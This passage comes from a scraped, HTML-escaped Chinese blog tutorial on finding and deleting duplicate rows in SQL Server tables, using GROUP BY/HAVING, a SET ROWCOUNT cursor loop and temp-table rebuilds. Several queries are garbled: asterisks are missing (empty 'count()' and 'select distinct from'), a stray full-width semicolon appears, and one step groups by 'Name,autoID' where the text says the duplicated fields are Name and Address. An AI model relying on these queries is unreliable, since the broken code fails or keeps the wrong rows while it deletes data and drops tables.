src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div><br></div>","excerpt":"","more":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> 